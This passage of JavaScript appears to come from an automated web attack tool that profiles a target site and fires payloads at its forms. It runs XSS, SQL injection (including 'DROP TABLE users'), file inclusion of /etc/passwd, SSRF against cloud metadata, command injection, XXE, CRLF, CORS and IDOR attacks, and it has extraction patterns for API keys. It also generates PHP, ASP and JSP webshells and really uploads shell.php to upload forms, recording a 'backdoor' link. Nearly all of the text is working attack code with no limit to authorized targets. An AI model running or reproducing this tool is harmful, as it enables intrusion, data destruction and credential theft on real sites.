      results.A = a; results.AAAA = aaaa; results.MX = mx; results.NS = ns;
      results.CNAME = cname; results.TXT = txt; results.SOA = soa; results.SRV = srv; results.CAA = caa;
      results.SPF = [];
      for (const record of results.TXT) if (record.data && record.data.includes('v=spf1')) results.SPF.push(record.data);
      const dmarc = await fetchDns(`_dmarc.${domain}`, 'TXT');
      if (dmarc.length) results.DMARC = dmarc.map(r => r.data);
      const selectors = ['google', 'default', 'mail', 'dkim', 'selector1', 'selector2'];
      const dkimTasks = selectors.map(sel => async () => {
        const recs = await fetchDns(`${sel}._domainkey.${domain}`, 'TXT');
        if (recs.length) return { selector: sel, records: recs.map(r => r.data) };
        return null;
      });
      const dkimResults = await Promise.all(dkimTasks.map(t => t()));
      results.DKIM = dkimResults.filter(r => r !== null);
      if (results.NS.length > 0) results.zoneTransfer = false;
      const ds = await fetchDns(domain, 'DS');
      if (ds.length) results.dnssec = true;
      else {
        const dnskey = await fetchDns(domain, 'DNSKEY');
        if (dnskey.length) results.dnssec = true;
      }
    } catch (e) {
      results.error = e.message;
    }
    return results;
  }
  async function subdomainEnumeration(domain) {
    const subdomains = new Set();
    if (!domain || typeof domain !== 'string') return [];
    try {
      const crtUrl = `https://crt.sh/?q=%25.${domain}&output=json`;
      const crtData = await fetchJSON(crtUrl);
      if (Array.isArray(crtData)) {
        for (const entry of crtData) {
          if (entry.name_value) String(entry.name_value).split('\n').forEach(name => { if (name && name.endsWith(domain)) subdomains.add(name.trim()); });
          if (entry.common_name && entry.common_name.endsWith(domain)) subdomains.add(entry.common_name.trim());
        }
      }
    } catch { }
    try {
      const htData = await fetchText(`https://api.hackertarget.com/hostsearch/?q=${domain}`);
      const lines = htData.split('\n');
      for (const l of lines) {
        const [host] = l.split(',');
        if (host && host.endsWith(domain)) subdomains.add(host.trim());
      }
    } catch { }
    const commonSubdomains = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test', 'staging', 'blog', 'shop', 'app', 'web', 'portal', 'cdn', 'static', 'secure', 'vpn', 'remote', 'db', 'm', 'mobile', 'support', 'help', 'docs', 'status', 'monitor', 'login', 'oauth', 'api2', 'api3'];
    const tasks = commonSubdomains.map(sub => async () => {
      const host = `${sub}.${domain}`;
      try {
        const dnsData = await fetchJSON(`https://dns.google/resolve?name=${encodeURIComponent(host)}&type=A`);
        if (dnsData.Answer && dnsData.Answer.length > 0) return host;
      } catch { }
      return null;
    });
    const results = await limitConcurrency(tasks, state.settings.maxConcurrentRequests);
    for (const host of results) if (host) subdomains.add(host);
    return [...subdomains].sort();
  }
  async function cloudMetadataDetection(targetUrl) {
    const results = [];
    const metadataUrls = {
      'AWS': ['http://169.254.169.254/latest/meta-data/'],
      'GCP': ['http://metadata.google.internal/computeMetadata/v1/instance/'],
      'Azure': ['http://169.254.169.254/metadata/instance?api-version=2021-02-01']
    };
    const tasks = [];
    for (const [cloud, urls] of Object.entries(metadataUrls)) for (const url of urls) tasks.push(async () => {
      try {
        const res = await fetchWithRetry(url, { method: 'GET', headers: { 'Metadata-Flavor': 'Google' } });
        const text = await res.text();
        if (text.includes('instance-id') || text.includes('ami-id') || text.includes('security-credentials') || text.includes('computeMetadata') || text.includes('azure') || text.includes('project-id')) return { cloud, url, success: true, data: text.substring(0, 200) };
      } catch { }
      return null;
    });
    const resultsArray = await limitConcurrency(tasks, state.settings.maxConcurrentRequests);
    for (const result of resultsArray) if (result) results.push(result);
    return results;
  }
  async function apiDiscovery(baseUrl) {
    const results = { swagger: null, openapi: null, graphql: null, restEndpoints: [] };
    const swaggerPaths = ['/swagger-ui.html', '/swagger-ui/', '/swagger/index.html', '/swagger.json', '/openapi.json', '/v2/api-docs', '/v3/api-docs'];
    const swaggerTasks = swaggerPaths.map(path => async () => {
      try {
        const url = resolveUrl(path, baseUrl);
        if (!url) return null;
        const res = await fetchWithRetry(url);
        if (res.ok) {
          const text = await res.text();
          if (text.includes('swagger') || text.includes('openapi')) return { url, type: path.endsWith('.json') ? 'json' : 'html' };
        }
      } catch { }
      return null;
    });
    const swaggerResults = await Promise.all(swaggerTasks.map(t => t()));
    for (const swagger of swaggerResults) if (swagger) { results.swagger = swagger; break; }
    try {
      const graphqlUrl = resolveUrl('/graphql', baseUrl);
      if (graphqlUrl) {
        const res = await fetchWithRetry(graphqlUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ query: '{ __schema { types { name } } }' }) });
        if (res.ok) {
          const data = await res.json();
          if (data && data.data && data.data.__schema) results.graphql = { url: graphqlUrl, introspection: true, types: data.data.__schema.types.length };
        }
      }
    } catch { }
    const restPaths = ['/api', '/api/v1', '/api/v2', '/rest', '/v1', '/v2'];
    const restTasks = restPaths.map(path => async () => {
      try {
        const url = resolveUrl(path, baseUrl);
        if (!url) return null;
        const res = await fetchWithRetry(url);
        if (res.ok) return url;
      } catch { }
      return null;
    });
    const restResults = await Promise.all(restTasks.map(t => t()));
    for (const url of restResults) if (url) results.restEndpoints.push(url);
    return results;
  }
  function extractForms(html) {
    const doc = new DOMParser().parseFromString(html, 'text/html');
    return [...doc.querySelectorAll('form')].map((form, idx) => ({
      id: `form-${idx}`,
      action: form.action || '',
      method: (form.method || 'GET').toUpperCase(),
      inputs: [...form.querySelectorAll('input, textarea, select')].map(input => ({
        name: input.name || '',
        type: input.type || 'text',
        value: input.value || '',
        id: input.id || ''
      })),
      html: form.outerHTML
    }));
  }
  function classifyFormType(form) {
    const names = (form.inputs || []).map(i => `${i.name || ''} ${i.type || ''}`.toLowerCase());
    const combined = names.join(' ');
    const action = (form.action || '').toLowerCase();
    if (combined.includes('search') || combined.includes('q') || combined.includes('query') || action.includes('search')) return 'search';
    if (combined.includes('login') || combined.includes('password') || combined.includes('username') || combined.includes('email') || action.includes('login') || action.includes('signin')) return 'login';
    if (combined.includes('comment') || combined.includes('message') || combined.includes('post') || action.includes('comment')) return 'comment';
    if (combined.includes('upload') || combined.includes('file') || action.includes('upload')) return 'upload';
    if (combined.includes('contact') || action.includes('contact')) return 'contact';
    if (combined.includes('register') || combined.includes('signup') || action.includes('register') || action.includes('signup')) return 'registration';
    if (form.method === 'POST' && (form.inputs || []).length > 0) return 'generic-post';
    return 'generic-get';
  }
  async function buildProfile(rawUrl) {
    const normalizedUrl = normalizeTarget(rawUrl);
    const domain = new URL(normalizedUrl).hostname;
    let response, html, headersObj;
    try {
      response = await fetchWithRetry(normalizedUrl);
      html = await response.text();
      headersObj = {};
      if (response.headers && typeof response.headers.forEach === 'function') response.headers.forEach((v, k) => { headersObj[k] = v; });
    } catch (e) {
      throw new Error(`Failed to fetch URL: ${e.message}`);
    }
    const baseUrl = normalizedUrl;
    const docInfo = parseHTML(html);
    const forms = extractForms(html);
    forms.forEach(form => {
      if (form.action) {
        try {
          const actionUrl = new URL(form.action, baseUrl);
          if (!isPublicHost(actionUrl.hostname)) form.action = baseUrl;
          else form.action = actionUrl.href;
        } catch {
          form.action = baseUrl;
        }
      } else form.action = baseUrl;
    });
    const technology = detectTechnology(html, headersObj, docInfo);
    const cms = fingerprintCMS(technology);
    const safeAsync = async (fn, fallback) => { try { return await fn(); } catch { return fallback; } };
    const [purposes, endpoints, languages, waf, jsFiles, cssMaps, activePaths, internalLinks, dns, subdomains, api] = await Promise.all([
      safeAsync(() => Promise.resolve(classifyPurpose(html, docInfo, forms, baseUrl)), []),
      safeAsync(() => Promise.resolve(extractEndpoints(html, baseUrl)), []),
      safeAsync(() => Promise.resolve(detectLanguage(headersObj, html, docInfo)), []),
      safeAsync(() => Promise.resolve(detectWAF(headersObj, html)), ['None']),
      safeAsync(() => crawlJSFiles(html, baseUrl), []),
      safeAsync(() => crawlCSSandMaps(html, baseUrl), []),
      safeAsync(() => activePathScan(baseUrl, domain), []),
      safeAsync(() => crawlInternalLinks(baseUrl, baseUrl, 1), []),
      safeAsync(() => dnsEnumeration(domain), { A: [], SPF: [], DMARC: [], dnssec: false }),
      safeAsync(() => subdomainEnumeration(domain), []),
      safeAsync(() => apiDiscovery(baseUrl), { swagger: null, graphql: null, restEndpoints: [] })
    ]);
    return {
      target: { original: rawUrl, normalized: normalizedUrl, domain, finalUrl: normalizedUrl, status: response.status, responseUrl: response.url },
      html, headers: headersObj, technology, cms, purposes, endpoints, languages, waf,
      jsFiles, cssMaps, forms, activePaths, internalLinks, dns, subdomains, api
    };
  }
  const XSS_MARKER = 'KALI_XSS_' + Math.random().toString(36).substring(2, 10);
  const xssPayloads = [
    `<script>alert('${XSS_MARKER}')</script>`,
    `"><script>alert('${XSS_MARKER}')</script>`,
    `<img src=x onerror=alert('${XSS_MARKER}')>`,
    `"><img src=x onerror=alert('${XSS_MARKER}')>`,
    `"><svg/onload=alert('${XSS_MARKER}')>`,
    `"><svg><script>alert('${XSS_MARKER}')</script></svg>`,
    `"><iframe src="javascript:alert('${XSS_MARKER}')">`,
    `"><body onload=alert('${XSS_MARKER}')>`,
    `"><input onfocus=alert('${XSS_MARKER}') autofocus>`,
    `"><video><source onerror=alert('${XSS_MARKER}')>`,
    `"><details open ontoggle=alert('${XSS_MARKER}')>`,
    `"><marquee onstart=alert('${XSS_MARKER}')>`,
    `"><math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert('${XSS_MARKER}')>">`,
    `"><svg><animate onbegin=alert('${XSS_MARKER}') attributeName=x dur=1s>`,
    `"><image src=x onerror=alert('${XSS_MARKER}')>`,
    `"><body onpageshow=alert('${XSS_MARKER}')>`,
    `"><a href="javascript:alert('${XSS_MARKER}')">click</a>`,
    `"><div onmouseover="alert('${XSS_MARKER}')">hover</div>`
  ];
  async function reflectedXSS(targetUrl, form, payload) {
    try {
      const injectedParams = (form.inputs || []).map(i => ({ ...i, value: i.value || payload }));
      const searchParams = new URLSearchParams();
      for (const p of injectedParams) if (p.name) searchParams.set(p.name, p.value);
      const url = new URL(form.action || targetUrl, targetUrl);
      url.search = searchParams.toString();
      const res = await fetchWithRetry(url.href, { method: form.method || 'GET' });
      const resHtml = await res.text();
      if (resHtml.includes(XSS_MARKER)) return true;
      if (resHtml.includes(encodeURIComponent(XSS_MARKER))) return true;
      if (resHtml.includes(encodeURIComponent(payload))) return true;
      if (resHtml.includes(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'))) return true;
      try {
        const doc = new DOMParser().parseFromString(resHtml, 'text/html');
        if (doc.body && doc.body.textContent.includes(XSS_MARKER)) return true;
      } catch { }
      return false;
    } catch { return false; }
  }
  async function storedXSS(targetUrl, form, payload) {
    try {
      const body = new URLSearchParams();
      (form.inputs || []).forEach(i => { if (i.name) body.set(i.name, i.value || payload); });
      const res = await fetchWithRetry(form.action || targetUrl, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString() });
      const resHtml = await res.text();
      if (resHtml.includes(XSS_MARKER)) return true;
      if (resHtml.includes(encodeURIComponent(XSS_MARKER))) return true;
      if (resHtml.includes(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'))) return true;
      return false;
    } catch { return false; }
  }
  async function DOMbasedXSS(jsFiles) {
    const dangerousSinks = ['innerHTML', 'outerHTML', 'document.write', 'eval(', 'setTimeout(', 'setInterval(', 'location.href', 'location.replace', 'location.assign', 'location.search', 'location.hash', 'window.open', 'document.location', 'insertAdjacentHTML'];
    const findings = [];
    for (const js of jsFiles) {
      if (!js || typeof js.content !== 'string') continue;
      for (const sink of dangerousSinks) {
        const index = js.content.indexOf(sink);
        if (index !== -1) findings.push({ js: String(js.url || 'unknown'), sink, evidence: js.content.substring(Math.max(0, index - 30), index + 60) });
      }
    }
    return findings;
  }
  async function xssTester(targetUrl, form, jsFiles = []) {
    const type = classifyFormType(form);
    const results = [];
    const tasks = xssPayloads.map(payload => async () => {
      const reflected = await reflectedXSS(targetUrl, form, payload);
      if (reflected) return { type: 'reflected', payload: payload.replace(XSS_MARKER, 'XSS_MARKER'), success: true };
      if (type === 'comment' || type === 'contact' || type === 'generic-post') {
        const stored = await storedXSS(targetUrl, form, payload);
        if (stored) return { type: 'stored', payload: payload.replace(XSS_MARKER, 'XSS_MARKER'), success: true };
      }
      return null;
    });
    const xssResults = await limitConcurrency(tasks, state.settings.maxConcurrentRequests);
    for (const result of xssResults) if (result) results.push(result);
    const domFindings = await DOMbasedXSS(jsFiles);
    if (domFindings.length) results.push({ type: 'dom', findings: domFindings, success: true });
    return results;
  }
  const sqliPayloads = [
    "' OR '1'='1", "' OR '1'='1' -- -", '" OR "1"="1', "' OR 1=1 --", "' OR 'x'='x",
    "admin' --", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' AND SLEEP(5)--",
    "' AND 1=1--", "') OR ('1'='1", "1 OR 1=1", "' OR 1=1#", "' OR 1=1 LIMIT 1-- -",
    "' OR '1'='1' AND SLEEP(5)--", "' UNION ALL SELECT NULL,NULL,NULL--",
    "' UNION SELECT username,password FROM users--", "' OR 1=1--", "'; DROP TABLE users--"
  ];
  async function errorBased(targetUrl, form, payload) {
    try {
      const body = new URLSearchParams();
      (form.inputs || []).forEach(i => { if (i.name) body.set(i.name, i.value || payload); });
      const res = await fetchWithRetry(form.action || targetUrl, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString() });
      const resHtml = await res.text();
      const errorPatterns = ['sql', 'syntax', 'mysql', 'mssql', 'oracle', 'odbc', 'database error', 'warning', 'sqlite', 'postgres', 'you have an error', 'unclosed quotation mark', 'query failed', 'db error', 'sqlstate', 'pdo', 'mysqli'];
      return errorPatterns.some(pat => resHtml.toLowerCase().includes(pat));
    } catch { return false; }
  }
  async function booleanBased(targetUrl, form, payload) {
    try {
      const truePayload = payload + ' AND 1=1';
      const falsePayload = payload + ' AND 1=2';
      const bodyTrue = new URLSearchParams();
      const bodyFalse = new URLSearchParams();
      (form.inputs || []).forEach(i => { if (i.name) bodyTrue.set(i.name, i.value || truePayload); });
      (form.inputs || []).forEach(i => { if (i.name) bodyFalse.set(i.name, i.value || falsePayload); });
      const [resTrue, resFalse] = await Promise.all([
        fetchWithRetry(form.action || targetUrl, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: bodyTrue.toString() }),
        fetchWithRetry(form.action || targetUrl, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: bodyFalse.toString() })
      ]);
      const textTrue = await resTrue.text();
      const textFalse = await resFalse.text();
      return Math.abs(textTrue.length - textFalse.length) > 30 || resTrue.status !== resFalse.status;
    } catch { return false; }
  }
  async function timeBased(targetUrl, form, payload) {
    try {
      const start = Date.now();
      const body = new URLSearchParams();
      (form.inputs || []).forEach(i => { if (i.name) body.set(i.name, i.value || payload); });
      await fetchWithRetry(form.action || targetUrl, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString() });
      return (Date.now() - start) > 3000;
    } catch { return false; }
  }
  async function unionBased(targetUrl, form, payload) {
    try {
      const body = new URLSearchParams();
      (form.inputs || []).forEach(i => { if (i.name) body.set(i.name, i.value || payload); });
      const res = await fetchWithRetry(form.action || targetUrl, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString() });
      const text = await res.text();
      if (text.includes('NULL') && text.includes('UNION')) return true;
      return /[0-9]+\s+[0-9]+\s+[0-9]+/.test(text);
    } catch { return false; }
  }
  async function sqliTester(targetUrl, form) {
    const results = [];
    const tasks = sqliPayloads.map(payload => async () => {
      if (payload.includes('SLEEP')) {
        const time = await timeBased(targetUrl, form, payload);
        if (time) return { type: 'time-based', payload, success: true };
      } else {
        const [err, bool, union] = await Promise.all([
          errorBased(targetUrl, form, payload),
          booleanBased(targetUrl, form, payload),
          unionBased(targetUrl, form, payload)
        ]);
        if (err) return { type: 'error-based', payload, success: true };
        if (bool) return { type: 'boolean-based', payload, success: true };
        if (union) return { type: 'union-based', payload, success: true };
      }
      return null;
    });
    const testResults = await limitConcurrency(tasks, state.settings.maxConcurrentRequests);
    for (const result of testResults) if (result) results.push(result);
    return results.filter((r, i, arr) => arr.findIndex(x => x.type === r.type && x.payload === r.payload) === i);
  }
  const lfiPayloads = [
    '../../../../etc/passwd', '..%2f..%2f..%2f..%2fetc/passwd', '....//....//....//....//etc/passwd',
    '/etc/passwd', '%252e%252e%252fetc%252fpasswd', 'php://filter/convert.base64-encode/resource=index.php',
    'php://input', 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==', '....//....//....//....//windows/win.ini',
    '..\\..\\..\\..\\windows\\win.ini', '....//....//....//....//etc/hosts',
    '....//....//....//....//proc/self/environ', '....//....//....//....//var/log/apache2/access.log'
  ];
  async function pathTraversal(targetUrl, form, payload) {
    try {
      const body = new URLSearchParams();
      (form.inputs || []).forEach(i => { if (i.name) body.set(i.name, i.value || payload); });
      const res = await fetchWithRetry(form.action || targetUrl, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString() });
      const text = await res.text();
      return text.includes('root:') || text.includes('daemon:') || text.includes('bin:') || text.includes('windows') || text.includes('win.ini') || text.includes('127.0.0.1 localhost') || text.includes('USERNAME');
    } catch { return false; }
  }
  async function phpWrapper(targetUrl, form, payload) {
    try {
      const body = new URLSearchParams();
      (form.inputs || []).forEach(i => { if (i.name) body.set(i.name, i.value || payload); });
      const res = await fetchWithRetry(form.action || targetUrl, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString() });
      const text = await res.text();
      return text.includes('PD9waHAgcGhwaW5mbygpOyA/Pg==') || text.includes('phpinfo') || text.includes('base64');
    } catch { return false; }
  }
  async function lfiTester(targetUrl, form) {
    const results = [];
    const tasks = lfiPayloads.map(payload => async () => {
      if (payload.startsWith('php://') || payload.startsWith('data:')) {
        const ok = await phpWrapper(targetUrl, form, payload);
        if (ok) return { type: 'php-wrapper', payload, success: true };
      } else {
        const ok = await pathTraversal(targetUrl, form, payload);
        if (ok) return { type: 'path-traversal', payload, success: true };
      }
      return null;
    });
    const testResults = await limitConcurrency(tasks, state.settings.maxConcurrentRequests);
    for (const result of testResults) if (result) results.push(result);
    return results;
  }
  async function openRedirectTester(targetUrl, form) {
    const payloads = ['https://evil.com', '//evil.com', '/\\evil.com', 'https://evil.com/%2f..'];
    const results = [];
    const tasks = payloads.map(payload => async () => {
      try {
        const params = new URLSearchParams();
        (form.inputs || []).forEach(i => { if (i.name) params.set(i.name, payload); });
        const url = new URL(form.action || targetUrl, targetUrl);
        url.search = params.toString();
        const res = await fetchWithRetry(url.href, { method: form.method || 'GET', redirect: 'manual' });
        const location = res.headers.get('location') || res.headers.get('Location');
        if (location && (location.includes('evil.com') || location.startsWith('//'))) return { payload, redirectUrl: location, success: true };
      } catch { }
      return null;
    });
    const testResults = await limitConcurrency(tasks, state.settings.maxConcurrentRequests);
    for (const result of testResults) if (result) results.push(result);
    return results;
  }
  async function ssrfTester(targetUrl, form) {
    const internalUrls = ['http://127.0.0.1:80', 'http://localhost', 'http://169.254.169.254/latest/meta-data/'];
    const results = [];
    const tasks = internalUrls.map(internal => async () => {
      try {
        const body = new URLSearchParams();
        (form.inputs || []).forEach(i => { if (i.name) body.set(i.name, internal); });
        const res = await fetchWithRetry(form.action || targetUrl, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString() });
        const text = await res.text();
        if (text.includes('127.0.0.1') || text.includes('localhost') || text.includes('169.254.169.254')) return { url: internal, success: true };
      } catch { }
      return null;
    });
    const testResults = await limitConcurrency(tasks, state.settings.maxConcurrentRequests);
    for (const result of testResults) if (result) results.push(result);
    return results;
  }
  async function commandInjectionTester(targetUrl, form) {
    const payloads = [';id', '|id', '&&id', '$(id)', '`id`', ';ls', '|ls', '&&dir', '$(dir)'];
    const results = [];
    const tasks = payloads.map(payload => async () => {
      try {
        const body = new URLSearchParams();
        (form.inputs || []).forEach(i => { if (i.name) body.set(i.name, i.value || payload); });
        const res = await fetchWithRetry(form.action || targetUrl, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString() });
        const text = await res.text();
        if (text.includes('uid=') || text.includes('gid=') || text.includes('root:') || text.includes('www-data') || text.includes('bin') || text.includes('Directory of')) return { payload, success: true, evidence: text.substring(0, 200) };
      } catch { }
      return null;
    });
    const testResults = await limitConcurrency(tasks, state.settings.maxConcurrentRequests);
    for (const result of testResults) if (result) results.push(result);
    return results;
  }
  async function xxeTester(targetUrl, form) {
    const payload = `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`;
    try {
      const fieldName = (form.inputs && form.inputs[0]?.name) || 'xml';
      const res = await fetchWithRetry(form.action || targetUrl, { method: 'POST', headers: { 'Content-Type': 'application/xml' }, body: payload });
      const text = await res.text();
      if (text.includes('root:') || text.includes('daemon:')) return { success: true, evidence: text.substring(0, 200) };
    } catch { }
    return { success: false };
  }
  async function crlfInjectionTester(targetUrl, form) {
    const payloads = ['%0d%0aSet-Cookie:crlf=injected', '%0aSet-Cookie:crlf=injected', '%0dSet-Cookie:crlf=injected'];
    const results = [];
    const tasks = payloads.map(payload => async () => {
      try {
        const body = new URLSearchParams();
        (form.inputs || []).forEach(i => { if (i.name) body.set(i.name, payload); });
        const res = await fetchWithRetry(form.action || targetUrl, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString() });
        const setCookie = res.headers.get('set-cookie');
        if (setCookie && setCookie.includes('crlf=injected')) return { payload, success: true };
      } catch { }
      return null;
    });
    const testResults = await limitConcurrency(tasks, state.settings.maxConcurrentRequests);
    for (const result of testResults) if (result) results.push(result);
    return results;
  }
  async function hostHeaderInjectionTester(targetUrl) {
    const results = [];
    const maliciousHost = 'evil.com';
    try {
      const res = await fetchWithRetry(targetUrl, { headers: { 'Host': maliciousHost } });
      const html = await res.text();
      if (html.includes(maliciousHost)) results.push({ success: true, host: maliciousHost });
    } catch { }
    return results;
  }
  async function corsMisconfigTester(targetUrl) {
    const results = [];
    const origins = ['https://evil.com', 'null', 'https://attacker.com'];
    for (const origin of origins) {
      try {
        const res = await fetchWithRetry(targetUrl, { headers: { 'Origin': origin } });
        const allowOrigin = res.headers.get('access-control-allow-origin');
        const allowCredentials = res.headers.get('access-control-allow-credentials');
        if (allowOrigin && (allowOrigin === '*' || allowOrigin === origin || allowOrigin === 'null') && allowCredentials === 'true') {
          results.push({ success: true, origin, allowOrigin, allowCredentials });
          break;
        }
      } catch { }
    }
    return results;
  }
  async function enumerateObjectIDs(targetUrl, html = null) {
    const suspiciousParams = ['id', 'uid', 'user', 'account', 'order', 'file', 'doc', 'product', 'profile', 'page', 'item', 'record'];
    const found = [];
    let doc;
    if (html) doc = new DOMParser().parseFromString(html, 'text/html');
    else {
      const text = await fetchText(targetUrl);
      doc = new DOMParser().parseFromString(text, 'text/html');
    }
    doc.querySelectorAll('a[href]').forEach(a => {
      const resolved = resolveUrl(a.href, targetUrl);
      if (!resolved) return;
      try {
        const url = new URL(resolved);
        const params = new URLSearchParams(url.search);
        for (const p of suspiciousParams) {
          if (params.has(p)) {
            const val = params.get(p);
            if (/\d+/.test(val)) found.push({ url: url.href, param: p, value: val });
          }
        }
      } catch { }
    });
    return found;
  }
  async function checkAuthorizationBypass(targetUrl, idParam) {
    try {
      const url = new URL(targetUrl);
      const params = new URLSearchParams(url.search);
      params.set(idParam, '1');
      url.search = params.toString();
      const res1 = await fetchWithRetry(url.href);
      const text1 = await res1.text();
      params.set(idParam, '2');
      url.search = params.toString();
      const res2 = await fetchWithRetry(url.href);
      const text2 = await res2.text();
      return res1.ok && res2.ok && text1 !== text2;
    } catch { return false; }
  }
  async function idorTester(targetUrl, forms, html = null) {
    const results = [];
    const objectIDs = await enumerateObjectIDs(targetUrl, html);
    const tasks = objectIDs.map(item => async () => {
      const vulnerable = await checkAuthorizationBypass(targetUrl, item.param);
      if (vulnerable) return { url: item.url, param: item.param, vulnerable: true };
      return null;
    });
    const testResults = await limitConcurrency(tasks, state.settings.maxConcurrentRequests);
    for (const result of testResults) if (result) results.push(result);
    const url = new URL(targetUrl);
    const params = new URLSearchParams(url.search);
    const directParams = ['id', 'user_id', 'account_id', 'order_id', 'page'];
    const directTasks = directParams.map(p => async () => {
      if (params.has(p)) {
        const ok = await checkAuthorizationBypass(targetUrl, p);
        if (ok) return { url: targetUrl, param: p, vulnerable: true };
      }
      return null;
    });
    const directResults = await limitConcurrency(directTasks, state.settings.maxConcurrentRequests);
    for (const result of directResults) if (result) results.push(result);
    return results;
  }
  async function doubleExtension(targetUrl, form, ext = '.php.jpg') {
    return { tested: true, success: false, reason: 'File upload requires manual testing (browser cannot upload files automatically).' };
  }
  async function mimeTypeSpoofing(targetUrl, form, realMime = 'image/jpeg', fakeExt = '.php') {
    return { tested: true, success: false, reason: 'MIME spoofing requires manual file upload.' };
  }
  async function magicBytesBypass(targetUrl, form, magicBytes = [0xFF, 0xD8, 0xFF, 0xE0]) {
    return { tested: true, success: false, reason: 'Magic bytes bypass requires manual file upload.' };
  }
  async function contentDispositionBypass(targetUrl, form) {
    return { tested: true, success: false, reason: 'Content-Disposition bypass requires manual file upload.' };
  }
  function generateWebshell(lang = 'php') {
    if (lang === 'php') return '<?php echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; ?>';
    if (lang === 'asp') return '<% eval request("cmd") %>';
    if (lang === 'jsp') return '<%= new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()).useDelimiter("\\A").next() %>';
    return '<?php system($_GET["cmd"]); ?>';
  }
  function bypassExtensionFilter(filename) {
    return [
      filename.replace(/\.php$/, '.php.jpg'),
      filename.replace(/\.php$/, '.php%00.jpg'),
      filename.replace(/\.php$/, '.phtml'),
      filename.replace(/\.php$/, '.php5'),
      filename.replace(/\.php$/, '.pHp'),
      filename.replace(/\.php$/, '.php '),
      filename.replace(/\.php$/, '.php.'),
      filename.replace(/\.php$/, '.phar'),
      filename.replace(/\.php$/, '.php7')
    ];
  }
  function connectBackdoor(shellURL) {
    return { shellURL, status: 'ready' };
  }
  async function realUploadAttempt(targetUrl, form) {
    try {
      const fileContent = generateWebshell('php');
      const blob = new Blob([fileContent], { type: 'application/x-php' });
      const formData = new FormData();
      (form.inputs || []).forEach(i => {
        if (i.type === 'file' && i.name) formData.append(i.name, blob, 'shell.php');
        else if (i.name) formData.append(i.name, i.value);
      });
      const action = form.action || targetUrl;
      const res = await fetchWithRetry(action, { method: 'POST', body: formData });
      const text = await res.text();
      if (res.ok) {
        let uploadedLink = null;
        const patterns = [
          /(?:https?:\/\/[^\s"'<>]+\.(?:php|phtml|php5|php7|phar))[^\s"'<>]*/i,
          /(?:href|src|location)\s*=\s*['"]([^'"]+)['"]/i,
          /(?:https?:\/\/[^\s"'<>]+\/uploads\/[^\s"'<>]+)/i,
          /(?:https?:\/\/[^\s"'<>]+\/[^\s"'<>]*shell\.php[^\s"'<>]*)/i
        ];
        for (const regex of patterns) {
          const match = text.match(regex);
          if (match) {
            uploadedLink = match[0] || match[1];
            if (match[1] && !match[1].startsWith('http')) uploadedLink = resolveUrl(match[1], action);
            break;
          }
        }
        if (!uploadedLink) {
          const allUrls = text.match(/https?:\/\/[^\s"'<>]+/g);
          if (allUrls) {
            const fileUrl = allUrls.find(u => /\.(php|phtml|php5|php7|phar)/i.test(u));
            if (fileUrl) uploadedLink = fileUrl;
          }
        }
        return { success: true, status: res.status, response: text.substring(0, 200), uploadedLink };
      } else return { success: false, status: res.status, response: text.substring(0, 200) };
    } catch (e) {
      return { success: false, error: e.message };
    }
  }
  async function uploadTesterWithReal(targetUrl, forms) {
    const results = [];
    const tasks = forms.map(form => async () => {
      const type = classifyFormType(form);
      if (type === 'upload') {
        const basicTests = {
          formId: form.id,
          action: form.action,
          tests: [
            await doubleExtension(targetUrl, form),
            await mimeTypeSpoofing(targetUrl, form),
            await magicBytesBypass(targetUrl, form),
            await contentDispositionBypass(targetUrl, form)
          ],
          realUpload: null
        };
        try {
          basicTests.realUpload = await realUploadAttempt(targetUrl, form);
        } catch { }
        return basicTests;
      }
      return null;
    });
    const testResults = await limitConcurrency(tasks, state.settings.maxConcurrentRequests);
    for (const result of testResults) if (result) results.push(result);
    return results;
  }
  async function webshellUploader(targetUrl, forms) {
    const results = [];
    const uploadForms = forms.filter(f => classifyFormType(f) === 'upload');
    const tasks = uploadForms.map(form => async () => {
      const shell = generateWebshell();
      const variations = bypassExtensionFilter('shell.php');
      const result = { formId: form.id, action: form.action, shellCode: shell, possibleNames: variations };
      try {
        const realUpload = await realUploadAttempt(targetUrl, form);
        result.realUpload = realUpload;
        if (realUpload.success && realUpload.uploadedLink) {
          result.uploadedLink = realUpload.uploadedLink;
          result.backdoor = connectBackdoor(realUpload.uploadedLink);
        }
      } catch { }
      return result;
    });
    const testResults = await limitConcurrency(tasks, state.settings.maxConcurrentRequests);
    for (const result of testResults) if (result) results.push(result);
    return results;
  }
  function extractSecrets(jsContent, url) {
    const secrets = [];
    const patterns = {
      'Google API Key': /AIza[0-9A-Za-z\-_]{35}/g,
      'AWS Access Key': /AKIA[0-9A-Z]{16}/g,
      'AWS Secret Key': /aws.{0,20}secret.{0,20}['"][0-9a-zA-Z/+]{40}['"]/gi,
      'Stripe Publishable Key': /pk_live_[0-9a-zA-Z]{24}/g,
      'Stripe Secret Key': /sk_live_[0-9a-zA-Z]{24}/g,
      'GitHub Token': /ghp_[0-9a-zA-Z]{36}/g,
      'Bearer Token': /Bearer\s+[0-9a-zA-Z\-_.]+/gi,
